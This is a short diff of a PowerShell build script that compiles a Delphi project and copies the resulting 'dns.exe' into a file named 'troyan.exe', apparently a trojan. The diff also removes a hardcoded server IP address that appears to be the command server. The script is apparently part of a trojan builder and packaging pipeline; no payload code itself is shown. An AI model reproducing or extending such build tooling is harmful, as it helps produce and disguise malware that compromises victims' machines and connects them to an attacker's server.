@@ -1,7 +1,6 @@
 param (
     [string]$serverName
 )
-$serverName="185.247.141.76"
 if ([string]::IsNullOrEmpty($serverName)) {
         throw "-serverName argument is null"
 }
@@ -38,7 +37,7 @@ Set-Location -Path (Split-Path -Path $dprFile -Parent)
 & "C:\Program Files (x86)\Borland\Delphi7\Bin\dcc32.exe" "$dprFile"
 $exeFile = Join-Path -Path $troyanDir -ChildPath "dns.exe"
 $currentExeFile = Join-Path -Path $dataDir -ChildPath "troyan.exe"
-Copy-Item -Path $exeFile -Destination $currentExeFile -Force #>
+Copy-Item -Path $exeFile -Destination $currentExeFile -Force
 
 
 #web
